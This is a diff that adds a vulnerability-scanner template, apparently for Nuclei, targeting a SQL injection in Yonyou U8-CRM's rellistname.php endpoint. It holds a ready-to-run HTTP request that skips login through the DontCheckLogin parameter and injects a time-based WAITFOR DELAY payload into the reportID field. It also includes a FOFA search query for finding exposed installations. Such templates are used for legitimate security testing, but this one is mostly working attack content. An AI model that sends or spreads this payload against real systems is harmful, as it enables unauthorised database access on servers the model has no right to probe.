@@ -1,0 +1,23 @@
+id: poc-fb9q039n8isb7uda
+info:
+  name: 用友U8-CRM rellistname Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fb9q039n8isb7uda'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fb9q039n8isb7uda
+    fofa: body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
+http:
+- raw:
+  - 'GET /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy''0:0:4''--+- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=bgsesstimeout-;'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
